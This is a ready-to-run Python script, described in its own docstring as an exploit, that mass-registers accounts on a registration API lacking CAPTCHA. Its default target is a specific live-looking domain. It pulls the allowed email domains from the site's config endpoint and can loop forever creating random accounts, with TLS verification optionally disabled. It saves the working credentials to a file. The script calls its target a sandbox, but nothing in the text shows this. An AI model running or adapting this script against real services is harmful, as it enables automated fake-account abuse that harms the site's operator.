#!/usr/bin/env python3
"""Exploit the sandbox registration endpoint that does not enforce CAPTCHA."""

from __future__ import annotations

import argparse
import json
import secrets
import string
import sys
import time
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

import requests


CONFIG_PATH = "/api/v1/guest/comm/config"
REGISTER_PATH = "/api/v1/passport/auth/register"


def build_credentials(domain: str) -> tuple[str, str]:
    local_part = f"qa-{secrets.token_hex(8)}"
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*-_"
    password = "Qa!9" + "".join(secrets.choice(alphabet) for _ in range(20))
    return f"{local_part}@{domain}", password


def api_url(base_url: str, path: str) -> str:
    return urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))


def response_payload(response: requests.Response) -> Any:
    try:
        return response.json()
    except requests.JSONDecodeError:
        return response.text[:1000]


def get_email_domains(session: requests.Session, base_url: str, timeout: float) -> list[str]:
    response = session.get(api_url(base_url, CONFIG_PATH), timeout=timeout)
    response.raise_for_status()
    payload = response.json()
    data = payload.get("data", payload) if isinstance(payload, dict) else {}

    for key in ("email_whitelist_suffix_ssyun", "email_whitelist_suffix"):
        domains = data.get(key)
        if isinstance(domains, list) and all(isinstance(domain, str) for domain in domains):
            return domains
    raise RuntimeError("registration config did not expose an email whitelist")


def registration_succeeded(status: int, payload: Any) -> bool:
    if not 200 <= status < 300:
        return False
    if not isinstance(payload, dict):
        return True
    return payload.get("status") in (None, "success") and payload.get("code", 0) in (0, 200)


def append_result(output: Path | None, result: dict[str, Any]) -> None:
    if output is None:
        return
    with output.open("a", encoding="utf-8") as stream:
        stream.write(json.dumps(result, ensure_ascii=False) + "\n")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="https://ssyun.org", help="Sandbox site origin")
    parser.add_argument("--count", type=int, default=1, help="Accounts to create; 0 loops forever")
    parser.add_argument("--delay", type=float, default=0.5, help="Seconds between registrations")
    parser.add_argument("--email-domain", help="Whitelist domain; defaults to one from live config")
    parser.add_argument("--timeout", type=float, default=15, help="HTTP timeout in seconds")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification")
    parser.add_argument("--output", type=Path, help="Append successful credentials as JSONL")
    parser.add_argument("--continue-on-error", action="store_true", help="Keep looping after failed attempts")
    arguments = parser.parse_args()

    if arguments.count < 0 or arguments.delay < 0 or arguments.timeout <= 0:
        parser.error("--count and --delay must be non-negative; --timeout must be positive")

    session = requests.Session()
    session.headers.update({"Accept": "application/json", "Content-Type": "application/json"})
    session.verify = not arguments.insecure

    try:
        domains = get_email_domains(session, arguments.base_url, arguments.timeout)
    except requests.RequestException as error:
        print(f"config request failed: {error}", file=sys.stderr)
        return 2
    except (ValueError, RuntimeError) as error:
        print(f"invalid registration config: {error}", file=sys.stderr)
        return 2

    domain = arguments.email_domain or domains[0]
    if domain not in domains:
        print(f"--email-domain must be in the live whitelist: {', '.join(domains)}", file=sys.stderr)
        return 2

    register_url = api_url(arguments.base_url, REGISTER_PATH)
    index = 0
    while arguments.count == 0 or index < arguments.count:
        index += 1
        email, password = build_credentials(domain)
        try:
            response = session.post(
                register_url,
                json={"email_ssyun": email, "password_ssyun": password, "invite_code": ""},
                timeout=arguments.timeout,
            )
            payload = response_payload(response)
            succeeded = registration_succeeded(response.status_code, payload)
            result = {
                "index": index,
                "email": email,
                "password": password,
                "http_status": response.status_code,
                "success": succeeded,
                "response": payload,
            }
        except requests.RequestException as error:
            succeeded = False
            result = {"index": index, "email": email, "password": password, "success": False, "error": str(error)}

        print(json.dumps(result, ensure_ascii=False), flush=True)
        if succeeded:
            append_result(arguments.output, result)
        elif not arguments.continue_on_error:
            return 1

        if (arguments.count == 0 or index < arguments.count) and arguments.delay:
            time.sleep(arguments.delay)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
